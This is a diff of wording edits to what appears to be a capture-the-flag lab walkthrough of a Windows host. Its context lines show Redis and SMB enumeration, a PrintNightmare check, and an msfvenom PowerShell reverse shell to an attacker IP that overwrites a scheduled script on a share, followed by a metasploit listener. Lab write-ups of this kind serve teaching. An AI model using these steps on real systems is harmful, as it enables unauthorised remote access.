@@ -44,13 +44,13 @@ PORT    STATE SERVICE       VERSION
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-An additional all ports scan reveals 9 additional ports open (6379 and higher in the list above).
+An all ports scan reveals 9 additional ports open (6379 and higher in the list above).
 
 <br>
 
 ## Redis Digging
 
-We're able to connect over to the Redis port 6379 and enumerate some information on it and the underlying system:
+We're able to connect over to the Redis instance on port 6379 and enumerate some information on it and the underlying system:
 
 `redis-cli -h 10.10.196.146 -p 6379`
 
@@ -145,7 +145,7 @@ Recovered........: 1/1 (100.00%) Digests
 
 ## SMB Digging
 
-Now that we have a valid user and password we can try taking a look around SMB. I use **crackmapexec** to enumerate the shares:
+We now have a valid username and password and can try taking a look around the SMB shares. I use **crackmapexec** to enumerate the shares:
 
 `crackmapexec smb 10.10.196.146 -u "enterprise-security" -p "<REDACTED>" --shares`
 
@@ -163,7 +163,7 @@ SMB         10.10.196.146   445    VULNNET-BC3TCK1  NETLOGON        READ        
 SMB         10.10.196.146   445    VULNNET-BC3TCK1  SYSVOL          READ            Logon server share 
 ```
 
-I take a look through these shares and find a powershell script named **PurgeIrrelevantData_1826.ps1** in the **Enterprise-Share** share that looks like it goes out to C:\Users\Public\Documents\ and removes any files there.
+After looking around I find a powershell script named **PurgeIrrelevantData_1826.ps1** in the **Enterprise-Share** share that looks like it goes out to C:\Users\Public\Documents\ and removes any files there.
 
 Running an **rid-brute** to enumerate a list of users:
 
@@ -187,7 +187,7 @@ SMB         10.10.196.146   445    VULNNET-BC3TCK1  1105: VULNNET\tony-skid (Sid
 
 ## RPC Digging
 
-I check to see if **print nightmare** is a possibility on the server, and it is, so once we establish a foothold we can likely use this to escalate our privileges:
+I check to see if **PrintNightmare** is a possibility on the server, and it is, so once we establish a foothold we can likely use this to escalate our privileges:
 
 `impacket-rpcdump 10.10.196.146 | egrep 'MS-RPRN|MS-PAR'`
 
@@ -200,9 +200,9 @@ Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
 
 ## System Access
 
-The powershell script we saw earlier looks like it would likely be run by the task scheduler every so often, so let's see if we can overwrite that script with one of our own.
+The powershell script we saw earlier looks like it would likely be run by the task scheduler every so often, so let's see if we can overwrite that script with one of our own to get a shell back.
 
-I use **msfvenom** to create a reverse shell with powershell:
+I use **msfvenom** to create a reverse powershell shell:
 
 `msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.6.127.197 LPORT=4444 -f psh -o PurgeIrrelevantData_1826.ps1`
 
@@ -215,7 +215,7 @@ Final size of psh file: 10199 bytes
 Saved as: PurgeIrrelevantData_1826.ps1
 ```
 
-I then connect over to the SMB share and upload it:
+I then connect over to the SMB share and upload it overwriting the existing file with that name:
 
 `put PurgeIrrelevantData_1826.ps1`
 
@@ -223,7 +223,7 @@ I then connect over to the SMB share and upload it:
 putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (43.5 kb/s) (average 43.5 kb/s)
 ```
 
-I set up a listener using **multi/handler** from within metasploit:
+I set up a listener using **multi/handler** from within **metasploit**:
 
 `use multi/handler`
 
